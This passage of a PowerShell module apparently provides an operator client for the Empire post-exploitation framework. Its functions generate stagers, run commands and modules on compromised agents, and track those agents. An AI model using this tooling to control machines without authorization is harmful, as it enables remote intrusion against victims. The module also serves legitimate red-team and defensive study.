            SessionTarget{Empire-Target -Session $Sess}
            ## New
            SessionNew{
                $Null = $PSBoundParameters.Remove('New')
                $Result = EmpireConnect @PSBoundParameters
                if($result.Token){AutoSession -ID ($Global:EmpireSession.Count -1)}
                }
            ## Remove
            SessionRemove{
                If(-Not$Script:DynP.IsSet){Write-Warning "Specify Session ID"}
                Else{
                    $Global:EmpireSession.Remove(($Global:EmpireSession |? ID -eq $Script:DynP.Value))
                    if($Fix){FixSession; Write-Warning "Target Session set to 0";$Global:EmpireTarget.ID=0}
                    }}}}
    ## Return Result
    End{$Script:DynP = $Null; Return $Result}
    }
#end



################################## Empire-Sniper

<#
.Synopsis
   Empire Sniper
.DESCRIPTION
   Multiline SpriptPane Sniper Mode ISE/VSCode
.EXAMPLE
   Sniper 4 -to 5 -Blind
#>
Function Empire-Sniper{
    [CmdletBinding(DefaultParameterSetName='Line')]
    [Alias('Sniper','xxx')]
    Param(
        [ValidateCount(1,2)]
        [Parameter(Mandatory=1,Position=0,ParameterSetName='Line')][Int[]]$Line,
        [Parameter(Mandatory=0,ParameterSetName='Select')][Switch][Alias('S')]$Selection,
        [Parameter(Mandatory=0)][Switch]$Blind,
        [Parameter(Mandatory=0)][Switch]$Json
        )
    DynamicParam{
        # Return Dico
        return DynDico -Name Name -Type String -Mandat 0 -Pipe 1 -Pos 1 -VSet ([Array]$Global:EmpireList.AgentName)    
        }
    ## Make It So
    Begin{
        # Empry Collector
        $Result = @()
        # Line To
        if($Line){
            $From = $Line[0]
            if($Line.count -eq 1){$To = $From}
            else{$To=$Line[1]}
            }
        # Get Text
        Switch -Regex($Host.name){
            # If ISE
            'ISE Host'{
                $Editor = $psISE.CurrentFile.Editor
                # If by Line number
                if($Line){
                    $Editor.Select($From,1,$To,$Editor.GetLineLength($To)+1)
                    $psISE.CurrentPowerShellTab.ConsolePane.Focus()
                    $TXT = $Editor.SelectedText
                    }
                # If by Selection
                if($Selection){$TXT = $Editor.SelectedText}
                }
            # If VSCode
            'Visual Studio'{
                $Editor = $psEditor.GetEditorContext()
                # If by Line number
                if($Line){
                    # Highlight
                    $Editor.SetSelection($from,1,$To+1,1)
                    # Get full text
                    if($Line.count -eq 2){$TXT = ($Editor.CurrentFile.GetTextLines())[($from-1)..($to-1)]}
                    else{$TXT = ($Editor.CurrentFile.GetTextLines())[$from-1]}
                    }
                # If by Selection
                if($Selection){}
                }}
        # Text to single String
        $CmdString = ($TXT.split("`n").trim()|?{$_-ne''}|?{$_-notmatch"^#"})-join';'
        if($CmdString -eq ''){$Flag=$true;Write-Warning 'No Command String...'}
        }
    Process{
        if($Flag){Return}
        # Target
        if($PSBoundParameters.Name){$Agt=$PSBoundParameters.Name}
        else{$Agt=$Global:EmpireTarget.Agent}
        $Switchz = $PSBoundParameters
        $Null = ($Switchz).remove('Line')
        $Null = ($Switchz).remove('Name')
        # Blind or not
        if($Blind){Empire-Exec -Command $CmdString -Name $Agt @Switchz}
        else{$Result += Empire-Exec -Command $CmdString -Name $Agt @Switchz}
        }
    ## Return Result
    End{$Script:DynP=$Null; Return $Result}
    }
#End


################################### Empire-Speak

<#
.Synopsis
   Empire Speak
.DESCRIPTION
   Add Speech to Automations
.EXAMPLE
   Speak "I am Your Father..."
#>
function Empire-Speak{
    [CmdletBinding(HelpUri='https://github.com/EmpireProject/Empire/wiki')]
    [Alias('Speak','Say')]
    Param(
        # Message
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, Position=0)]
        [ValidateNotNull()][String[]]$Speech,
        # Return prompt without waiting
        [switch]$Async,
        # Speech Volume
        [ValidateRange(0,100)][int]$Volume=100,
        # Speech Rate
        [ValidateRange(-10,10)][int]$Rate=-1    
        )
    DynamicParam{
        # Get installed voices (name only)
        $ValSet = @()
        (New-Object System.Speech.Synthesis.SpeechSynthesizer).GetInstalledVoices().voiceinfo.name | %{$ValSet += $_.split(' ')[1]}
        ## Dictionary
        # Create runtime Dictionary for this ParameterSet
        $Dico = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        ## Dyn1
        # Create Attribute Object
        $Attrib = New-Object System.Management.Automation.ParameterAttribute
        $Attrib.Mandatory = $false
        $Attrib.HelpMessage = "Select voice"
        # Create AttributeCollection object for the attribute Object
        $Collection = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute to collection
        $Collection.Add($Attrib)
        # Add Validate Set to attribute collection     
        $ValidateSet=new-object System.Management.Automation.ValidateSetAttribute($ValSet)
        $Collection.Add($ValidateSet)
        # Create Runtime Parameter with matching attribute collection
        $DynP = New-Object System.Management.Automation.RuntimeDefinedParameter('Voice', [String], $Collection)
        # Add Runtime Param to dictionary
		$Dico.Add('Voice',$dynP)
        ## Return Dico
        Return $Dico
        }
    ## Make It So
    Begin{
        # Create speech object
        $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
        # Voice full name
        if($DynP.IsSet){
            $Voice = "Microsoft $($DynP.Value) Desktop"
            }
        Else{$voice=$SpeechSynth.GetInstalledVoices().VoiceInfo.name[0]}
        # Adjust voice settings
        $SpeechSynth.SelectVoice($Voice)
        $SpeechSynth.volume=$Volume
        $SpeechSynth.Rate=$Rate
        }
    Process{
        # if -Async
        if($Async){$SpeechSynth.SpeakAsync($Speech) | Out-Null}
        # else
        else{$SpeechSynth.Speak($Speech) | out-null}
        }
    ## NoOut
    End{$Script:DynP=$Null}
    }
#end



################################## Empire-Stager

<#
.Synopsis
   Interact with Stagers
.DESCRIPTION
   Long Description
.EXAMPLE
   Empire-Stager
   Example Description
.EXAMPLE
   Empire-Stager
   Example Description
.INPUTS
   Inputs
.OUTPUTS
   Outputs
.NOTES
   Notes
.FUNCTIONALITY
   Functionality
.LINK
   https://github.com/EmpireProject
#>
Function Empire-Stager{
    [CmdletBinding(DefaultParameterSetname='StagerView',HelpUri='https://github.com/EmpireProject/Empire/wiki')]
    [Alias('Stager','Stg')]
    Param(
		# List Stager
		[Parameter(Mandatory=1,ParameterSetName='StagerList')][switch]$List,
		# View Stager Type
		[Parameter(Mandatory=0,ParameterSetName='StagerView')][switch]$View,
		# Use Stager Type (temp memory)
		[Parameter(Mandatory=1,ParameterSetName='StagerUse')][Alias('Load','Select')][switch]$Use,
		# Set  Stager Option
		[Parameter(Mandatory=1,ParameterSetName='StagerOption')][Alias('Set')][switch]$Option,
		# Generate Stager from Options
		[Parameter(Mandatory=1,ParameterSetName='StagerNew')][Alias('New','X')][switch]$Generate,
		# New Stager to clipboard
		[Parameter(Mandatory=0,ParameterSetName='StagerNew')][Alias('Clip')][switch]$ToClipboard,
		# Sync Stager Type List
		[Parameter(Mandatory=1,ParameterSetName='StagerSync')][switch]$Sync
		)
    DynamicParam{
        # Filter ParamSet
        if($PSCmdlet.ParameterSetName -in 'StagerView','StagerUse'){
            # Return Dico
            return DynDico -Name Type -Type String -Mandat 1 -Pipe 0 -Pos 0 -VSet $Global:EmpireList.StagerType    
            }
      <#if($PSCmdlet.ParameterSetName -eq 'StagerNew'){
            # Return Dico
            return DynDico -Name Type -Type String -Mandat 1 -Pipe 0 -Pos 0 -VSet $Global:EmpireList.ListenerName    
            }#>
        if($PSCmdlet.ParameterSetName -eq 'StagerList'){
            # Return Dico
            return DynDico -Name ID -Type Int -Mandat 0 -Pipe 1 -Pos 0 -VSet (DynSession)
            }
        if($PSCmdlet.ParameterSetName -eq 'StagerOption'){
            ## Prep Empty Dico
            $Dico = New-Object Management.Automation.RuntimeDefinedParameterDictionary
            ## Name
            # Create Attribute Obj
            $VSet = $Global:EmpireList.temp.Name
            $Attrb = New-Object Management.Automation.ParameterAttribute
            $Attrb.Mandatory=0
            $Attrb.Position=0
            # Create AttributeCollection
            $Cllct = New-Object Collections.ObjectModel.Collection[System.Attribute]
            # Add Attribute Obj to Collection
            $Cllct.Add($Attrb)
            # Create ValidateSet & add to collection     
            $VldSt=New-Object Management.Automation.ValidateSetAttribute($VSet)
            $Cllct.Add($VldSt)
            # Create Runtine DynParam
            $DynPar = New-Object Management.Automation.RuntimeDefinedParameter('Name',[String],$Cllct)
            # Add dynParam to Dictionary
            $Dico.Add('Name',$DynPar)      
            ## Value
            # Create Attribute Obj for Value
            $Attrb1 = New-Object Management.Automation.ParameterAttribute
            $Attrb1.Mandatory=0
            $Attrb1.Position=1
            # Create AttributeCollection
            $Cllct1 = New-Object Collections.ObjectModel.Collection[System.Attribute]
            # Add Attribute Obj to Collection
            $Cllct1.Add($Attrb1)
            # AllowEmptyString & add to collection     
            $EStr=New-Object Management.Automation.AllowEmptyStringAttribute
            $Cllct1.Add($EStr)
            # Create Runtine DynParam
            $DynVal = New-Object Management.Automation.RuntimeDefinedParameter('Value',[String],$Cllct1)
            # Add dynVal to Dictionary
            $Dico.Add('Value',$DynVal) 
            ## Return Dico
            Return $Dico
            }}
    ## Make It So
    Begin{$Result=@()}
    Process{
        # Switch Action
        Switch($PSCmdlet.ParameterSetName){
            ## List
            StagerList{
                # Session
                if($Script:DynP.IsSet){$Sess = $Script:DynP.Value}
                else{$Sess = $Global:EmpireTarget.ID}
                $Result = EmpireCall StagerList -ID $Sess
                }
            ## View Type
            StagerView{$Result = EmpireCall StagerView $Script:DynP.Value}
            # Use (Temp)
            StagerUse{
                $Global:EmpireList.TempType = $Script:DynP.Value 
                $Global:EmpireList.Temp = EmpireCall StagerView $Script:DynP.Value | UnpackOptions
                }
            ## Option
            StagerOption{
                if(-Not$DynPar.IsSet -and -Not$DynVal.IsSet){$Result = $Global:EmpireList.Temp}
                elseif($DynPar.IsSet -and $DynVal.IsSet){($Global:EmpireList.Temp|? Name -eq $DynPar.Value).Value = $DynVal.Value}
                else{Write-Warning "Must Specify Value"}
                }
            ## New
            StagerNew{
                $Tp = $Global:EmpireList.TempType
                $Obj = New-Object PSCustomObject -Property @{StagerName = $Tp}
                $Global:EmpireList.Temp |Select Name,Value|? Value -ne ''|%{$Obj|Add-Member NoteProperty -Name $_.Name -Value "$($_.Value)"}
                $Result = (EmpireCall StagerNew -Opt $Obj).$Tp.Output
                # If Clipboard
                if($ToClipboard){$Result|Set-ClipBoard; $Result=$Null}
                }
            ## Sync
            StagerSync{$Result = Empire-Sync -Stager}
            }}
    ## Return Result
    End{$Script:DynP = $Null; Return $Result}
    }
#end



################################## Empire-Strike

<#
.Synopsis
   Empire Strike
.DESCRIPTION
   Long Description
.EXAMPLE
   Empire-Strike
   Example Description
.EXAMPLE
   Empire-Strike
   Example Description
.INPUTS
   Inputs
.OUTPUTS
   Outputs
.NOTES
   Notes
.FUNCTIONALITY
   Functionality
.LINK
   https://github.com/EmpireProject
#>
Function Empire-Strike{
    [CmdletBinding(DefaultParameterSetname='StrikeView',HelpUri='https://github.com/EmpireProject/Empire/wiki')]
    [Alias('Strike','XX')]
    Param(
		# View Strike
		[Parameter(Mandatory=0,ParameterSetName='StrikeView')][switch]$View,
		# View Strike
		[Parameter(Mandatory=0,ParameterSetName='StrikeView')][switch]$Option,
		# Launch Strike
		[Parameter(Mandatory=1,ParameterSetName='StrikeX')][switch]$X,
		# No Reply
		[Parameter(Mandatory=0,ParameterSetName='StrikeX')][Alias('NoReply')][switch]$Blind,
		# No Reply
		[Parameter(Mandatory=0,ParameterSetName='StrikeX')][Alias('Sec')][Int]$MaxWait=30     
		)
    DynamicParam{
        # Filter ParamSet
        if($PSCmdlet.ParameterSetName -eq 'StrikeX'){
            # Return Dico
            return DynDico -Name Name -Type String -Mandat 0 -Pipe 1 -Pos 0 -VSet $Global:EmpireList.AgentName   
            }}
    ## Make It So
    Begin{$Result=@()}
    Process{
        Switch($PSCmdlet.ParameterSetName){
            ## StrikeView
            StrikeView{
                $Result = New-Object PSCustomObject -Property @{
                    ID     = $Global:EmpireTarget.ID
                    Agent  = $Global:EmpireTarget.Agent
                    Module = $Global:EmpireStrike.Module
                    Option = $Global:EmpireStrike.Option
                    } | Select ID,Agent*,Module,Option
                if($Option){$Result=$Result.option}
                Write-Warning "Use -x to Launch Strike..."
                }
            ## Strike X
            StrikeX{
                # Agent
                if($Script:DynP.IsSet){$Agt=$Script:DynP.Value}
                else{$Agt=$Global:EmpireTarget.Agent} 
                # Options
                $O = $Global:EmpireStrike.Option |? Name -ne Agent 
                if($O -AND (WarnMissing $O)){Return}
                # Options to Obj
                $Obj = New-Object PSCustomObject -Property @{Agent=$agt}
                $O | Select Name,Value|? Value -ne ''|%{
                    $Obj|Add-Member NoteProperty -Name $_.Name -Value "$($_.Value)"
                    }
                # Call API
                $reply = EmpireCall ModuleExec -Spec $Global:EmpireStrike.Module -Opt $Obj
                if($Reply.success -AND -Not$Blind){
                    Write-Verbose "$($Reply.msg) [TaskID: $($Reply.TaskID)]"
                    # Get Task ID
                    $Task = Empire-Event -View $Agt -Verbose:$False | ? event_type -eq Task
                    $LastTask = $Task[$Task.count -1]
                    # MaxWait TaskID Result
                    $Loop = 0
                    Write-Verbose "$AGT - Waiting for Job Start [max $MaxWait]"
                    Do{ Sleep 1
                        $LastRes = Empire-Event $agt -Verbose:$False | ? event_type -eq result |Sort ID -Descending | Select -first 1
                        $Loop ++}Until($LastRes.TaskID -eq $LastTask.TaskID -OR $Loop -eq $MaxWait)
                    # If too long...
                    If($Loop -eq $MaxWait){Write-Warning "$Agt - Skipping Results: Too Slow...";Break}
                    # Else result
                    Else{
                        $R = (Empire-Result $Agt -Verbose:$False).results.trim()
                        if($R -notmatch " completed!$"){Write-Verbose "$Agt - $R";Write-Verbose "$Agt - Waiting for Results [max $MaxWait]"}
                        while($R -notmatch " completed!$"){
                            Sleep 1
                            $R = (Empire-Result $Agt -Verbose:$False).results.trim()
                            $Loop ++
                            If($Loop -ge $MaxWait){Write-Warning "$Agt - Skipping Results: Too Slow...";Break}
                            }
                        #if($R -match " completed!$"){$R=$R.trim()}
                        $Result += $R
                        }}
                # If Blind or Error
                Else{$Result=$Null}
                }}}
    # Return Result
    End{$Script:DynP=$Null;if($Result){Return $Result}}
    }
#end



#################################### Empire-Sync

<#
.Synopsis
   Sync Session Objects
.DESCRIPTION
   Long Description
.EXAMPLE
   Empire-Sync
   Example Description
.EXAMPLE
   Empire-Sync
   Example Description
.INPUTS
   Inputs
.OUTPUTS
   Outputs
.NOTES
   Notes
.FUNCTIONALITY
   Functionality
.LINK
   https://github.com/EmpireProject
#>
Function Empire-Sync{
    [CmdletBinding(DefaultParameterSetname='SyncSession',HelpUri='https://github.com/EmpireProject/Empire/wiki')]
    [Alias('Sync')]
    Param(
		# Sync Sessions
		[Parameter(Mandatory=0,ParameterSetName='SyncSession')][switch]$Session,
		# Sync Modules
		[Parameter(Mandatory=1,ParameterSetName='SyncModule')][switch]$Module,
		# Sync Agents
		[Parameter(Mandatory=1,ParameterSetName='SyncAgent')][Alias('Agt')][switch]$Agent,
		# Sync Listener
		[Parameter(Mandatory=1,ParameterSetName='SyncListener')][Alias('Lst')][switch]$Listener,
        # Sync Stager Types
        [Parameter(Mandatory=1,ParameterSetName='SyncStager')][Alias('Stg')][switch]$Stager
		)
    ## Make It So
    Begin{$ID = $Global:EmpireTarget.ID}
    Process{
        # Action to Bool
        Switch($PSCmdlet.ParameterSetName){
            SyncSession {$SM=$SA=$SL=$SR=$True}
            SyncModule  {$SM=$True}
            SyncAgent   {$SA=$True}
            SyncListener{$SL=$True}
            SyncStager  {$SR=$True}
            }
        if($SM){
            # Sync Session Modules
            [Array]$Global:EmpireList.Module = EmpireCall ModuleList -ID $ID
            [Array]$Global:EmpireList.ModuleName = $Global:EmpireList.Module | Only Name | Sort           
            }
        if($SA){
            # Sync Session Agent Names
            [Array]$Global:EmpireList.AgentName = EmpireCall AgentList -ID $ID | Only Name | Sort
            }
        if($SL){
            # Sync Session Listener Names
            [Array]$Global:EmpireList.ListenerName = EmpireCall ListenerList -ID $ID | Only Name | Sort            
            }       
        if($SR){
            # Sync Session Stager Types
            [Array]$Global:EmpireList.StagerType = EmpireCall StagerList -ID $ID | Only Name | Sort            
            }}
    # No Output
    End{<# NoOut #>}
    }
#end



################################## Empire-Target

<#
.Synopsis
   Set Target
.DESCRIPTION
   Long Description
.EXAMPLE
   Empire-Target
   Example Description
.EXAMPLE
   Empire-Target
   Example Description
.INPUTS
   Inputs
.OUTPUTS
   Outputs
.NOTES
   Notes
.FUNCTIONALITY
   Functionality
.LINK
   https://github.com/EmpireProject
#>
Function Empire-Target{
    [CmdletBinding(DefaultParameterSetname='TargetAgent',HelpUri='https://github.com/EmpireProject/Empire/wiki')]
    [Alias('Target','Tgt')]
    Param(
		# Set Target Agent
		[Parameter(Mandatory=0,ParameterSetName='TargetAgent'  )][Alias('Agt')][switch]$Agent,
		# Set Target Session
		[Parameter(Mandatory=1,ParameterSetName='TargetSession')][switch]$Session,
		# Set Target Module (Strike)
        [Parameter(Mandatory=1,ParameterSetName='TargetModule' )][switch]$Module,
		# View Current Target
		[Parameter(Mandatory=1,ParameterSetName='TargetView'   )][switch]$View	
        )
    DynamicParam{
        # Filter ParamSet
        if($PSCmdlet.ParameterSetName -ne 'TargetView'){
            # Populate Vars
            Switch($PSCmdlet.ParameterSetName){
                #SET         { NAME     ; TYPE       ; MAND ; PIPE ; POS  ; VSET
                ######################################################################################...
                TargetSession{ $N='ID'  ; $T='Int'   ; $M=1 ; $L=0 ; $P=0 ; $V= DynSession                          }
                TargetAgent  { $N='Name'; $T='String'; $M=0 ; $L=0 ; $P=0 ; $V= [Array]$Global:EmpireList.AgentName }
                TargetModule { $N='Name'; $T='String'; $M=1 ; $L=0 ; $P=0 ; $V= [Array]$Global:EmpireList.ModuleName}
                }
            # Return Dico
            return DynDico -Name $N -Type $T -Mandat $M -Pipe $L -Pos $P -VSet $V  
            }}
    ## Make It So
    Begin{}
    Process{
        # Switch Action
        Switch($PSCmdlet.ParameterSetName){
            ## Target Session
            TargetSession{$Global:EmpireTarget.ID = $Script:DynP.Value; AutoSession -ID $Script:DynP.Value}
            ## Target Agent
            TargetAgent{
                if(-Not$Script:DynP.IsSet){$Result = $Global:EmpireTarget}
                else{$Global:EmpireTarget.Agent = $Script:DynP.Value}
                }
            ## Target Module
            TargetModule{
                $Global:EmpireStrike.Module = $Script:DynP.Value
                $Global:EmpireStrike.Option = $Global:EmpireList.Module |? Name -eq $Script:DynP.Value | UnpackOptions
                }
            ## View Target
            TargetView{$Result = $Global:EmpireTarget}
            }}
    ## Return Result
    End{$Script:DynP = $Null; Return $Result}
    }
#end



#################################### Empire-Tune

<#
.Synopsis
   Empire Tune
.DESCRIPTION
   Play Imperial March
   1=Short | 2=Medium | 3=Long
   Defaults to 2
.EXAMPLE
   ImperialMarch 3
#>
function Empire-Tune{
    [Alias('ImperialMarch','Tune','TaTaTaa')]
    Param(
        [ValidateSet('1','2','3')]
        [Parameter()]$v='2'
        )
    if($v){
        [console]::beep(440,500)
        [console]::beep(440,500)
        [console]::beep(440,500)
        [console]::beep(349,350)
        [console]::beep(523,150)
        [console]::beep(440,500)
        }
    if($v -match "2|3"){
        [console]::beep(349,350)
        [console]::beep(523,150)
        [console]::beep(440,1000)
        }
    if($v -eq '3'){
        [console]::beep(659,500)
        [console]::beep(659,500)
        [console]::beep(659,500)
        [console]::beep(698,350)
        [console]::beep(523,150)
        [console]::beep(415,500)
        [console]::beep(349,350)
        [console]::beep(523,150)
        [console]::beep(440,1000)
        }}
#####end



##################################### Empire-Use

<#
.Synopsis
   Empire Use
.DESCRIPTION
   Long Description
.EXAMPLE
   Empire-Use
   Example Description
.EXAMPLE
   Empire-Use
   Example Description
.INPUTS
   Inputs
.OUTPUTS
   Outputs
.NOTES
   Notes
.FUNCTIONALITY
   Functionality
.LINK
   https://github.com/EmpireProject
#>
Function Empire-Use{
    [CmdletBinding(DefaultParameterSetName='UseModule',HelpUri='https://github.com/EmpireProject/Empire/wiki')]
    [Alias('Use')]
    Param(
        [Parameter(Mandatory=1,ParameterSetName='UseStager')][Alias('Stg')][Switch]$Stager,
        [Parameter(Mandatory=1,ParameterSetName='UseListener')][Alias('Lst')][Switch]$Listener,
        [Parameter(Mandatory=1,ParameterSetName='UseListener',Position=0)][listenerType]$Type,
        [Parameter(Mandatory=0,ParameterSetName='UseModule')][Switch]$Module
        )
    DynamicParam{
        # Filter ParamSet
        if($PSCmdlet.ParameterSetName -in 'UseStager','UseModule'){
            Switch($PSCmdlet.ParameterSetName){
                #SET        { NAME     ; TYPE       ; MAND ; PIPE ; POS  ; VSET
                ####################################################################...
                UseStager   { $N='Name'; $T='String'; $M=1 ; $L=0 ; $P=0 ; $V=$Global:EmpireList.StagerType }
                UseModule   { $N='Name'; $T='String'; $M=1 ; $L=0 ; $P=0 ; $V=$Global:EmpireList.ModuleName }
                }
            # Return Dico
            return DynDico -Name $N -Type $T -Mandat $M -Pipe $L -Pos $P -VSet $V    
            }}
    ## Make It So
    Begin{}
    Process{
        # Switch Action
        Switch($PSCmdlet.ParameterSetName){
            # Stager
            UseStager{Empire-Stager -Use $Script:DynP.Value}
            # Listener
            UseListener{Empire-Listener -Use $Type.ToString()}
            # Module
            UseModule{
                $Global:EmpireStrike.Module = $Script:DynP.Value
                $Global:EmpireStrike.Option = $Global:EmpireList.Module | ? Name -eq $Script:DynP.Value | UnpackOptions
                }}}
    # Return Nothing
    End{$Script:DynP = $Null; Return}
    }
#end



#################################### Empire-View

<#
.Synopsis
   View Empire Objects
.DESCRIPTION
   Long Description
.EXAMPLE
   Empire-View
   Example Description
.EXAMPLE
   Empire-View
   Example Description
.INPUTS
   Inputs
.OUTPUTS
   Outputs
.NOTES
   Notes
.FUNCTIONALITY
   Functionality
.LINK
   https://github.com/EmpireProject
#>
Function Empire-View{
    [CmdletBinding(DefaultParameterSetname='ViewStrike',HelpUri='https://github.com/EmpireProject/Empire/wiki')]
    [Alias('View')]
    Param(
		# View Target
		[Parameter(Mandatory=1,ParameterSetName='ViewTarget')][Alias('Tgt')][switch]$Target,
		# View All Sessions
		[Parameter(Mandatory=1,ParameterSetName='ViewSession')][switch]$Session,
		# View All Modules
		[Parameter(Mandatory=1,ParameterSetName='ViewModule')][switch]$Module,
		# View All Agents
		[Parameter(Mandatory=1,ParameterSetName='ViewAgent')][Alias('Agt')][switch]$Agent,
		# View All Listeners
		[Parameter(Mandatory=1,ParameterSetName='ViewListener')][Alias('Lst')][switch]$Listerner,
		# View All Listeners
		[Parameter(Mandatory=1,ParameterSetName='ViewStager')][Alias('Stg')][switch]$Stager,
		# View Strike
		[Parameter(Mandatory=0,ParameterSetName='ViewStrike')][Alias('X')][switch]$Strike,
		# View Banner
		[Parameter(Mandatory=1,ParameterSetName='ViewBanner')][switch]$Banner
		)
    DynamicParam{
        # Filter ParamSet
        if($PSCmdlet.ParameterSetName -in 'ViewAgent','ViewStager','ViewListener','ViewModule','ViewSession'){
            # Populate Vars
            Switch($PSCmdlet.ParameterSetName){
                #SET        { NAME     ; TYPE        ; MAND ; PIPE ; POS  ; VSET
                ##################################################################################...
                ViewSession { $N='ID'   ; $T='String'; $M=0 ; $L=1 ; $P=0 ; $V= DynSession                             }
                ViewModule  { $N='Name' ; $T='String'; $M=0 ; $L=1 ; $P=0 ; $V=([Array]$Global:EmpireList.ModuleName)  }
                ViewListener{ $N='Name' ; $T='String'; $M=0 ; $L=1 ; $P=0 ; $V=([Array]$Global:EmpireList.ListenerName)}
                ViewStager  { $N='Type' ; $T='String'; $M=0 ; $L=1 ; $P=0 ; $V=([Array]$Global:EmpireList.StagerType)  }
                ViewAgent   { $N='Name' ; $T='String'; $M=0 ; $L=1 ; $P=0 ; $V=([Array]$Global:EmpireList.AgentName)   }
                }
            # Name !Mandat if -All
            if($All){$M=0}
            # Return Dico
            return DynDico -Name $N -Type $T -Mandat $M -Pipe $L -Pos $P -VSet $V    
            }}
    ## Make It So
    Begin{$Result= @()}
    Process{
        # Switch Action
        Switch($PSCmdlet.ParameterSetName){
            # Target
            ViewTarget{$result=$Global:EmpireTarget}
            # Session
            ViewSession{
                if($Script:DynP.IsSet){$Sess = $Script:DynP.Value}
                else{$Sess = $Global:EmpireTarget.ID}
                $result=$Global:EmpireSession |? ID -eq $Sess
                }
            # Module
            ViewModule{
                if($Script:DynP.IsSet){$result = $Global:EmpireList.Module|? Name -eq $Script:DynP.Value}
                else{$result = $Global:EmpireList.Module|Select name,description|Sort Name}
                }
            # Agent
            ViewAgent{
                if($Script:DynP.IsSet){$result = EmpireCall -Act AgentView -Spec $Script:DynP.Value}
                else{
                    Empire-Agent -List| %{
                        $Result += New-Object PSCustomObject -Prop @{
                            Name=$_.Name
                            Int = $_.High_Integrity
                            UserName = $_.Username
                            LastSeen = $_.lastseen_time
                            Language=$_.Language
                            Listener = $_.Listener
                            }|Select Name,Language,UserName,Int,Listener,LastSeen
                        }}}
            # listener
            ViewListener{
                if($Script:DynP.IsSet){$result = EmpireCall -Act ListenerView -Spec $Script:DynP.Value}
                else{$result = Empire-Listener -list | Select ID,name,module | Sort ID}
                }
            # Stager Type
            ViewStager{
                if($Script:DynP.IsSet){$result = EmpireCall StagerView -Spec $Script:DynP.Value}
                else{$result = Empire-Stager -list | Select name,description | Sort name}
                }
            # Strike Obj
            ViewStrike{
                $result = New-Object PSCustomObject -Prop @{
                    Module=$Global:EmpireStrike.Module
                    option=$Global:EmpireStrike.option
                    }}
            # Banner
            ViewBanner{$result = $Script:Banner}
            }}
    # Return Result
    end{$Script:DynP = $Null ;Return $result}
    }
#end



##################################### First Load
# SplashScreen on first load
if(!$Global:EmpireSession){Clear;$Banner;Tune ;Sleep -mil 500;Clear}
# Load Speech if not already done
if(-Not([appdomain]::currentdomain.getassemblies().where{$_.fullname -match '^System.Speech'})){Add-Type -AssemblyName System.Speech}


################################################

#endregion #####################################


################################################
##################################### DISCALIMER
#region Disclaimer
################################################
#
#                ¯\_(ツ)_/¯
#
#endregion #####################################


############################################ EOF
#2018@SadProcessor##############################


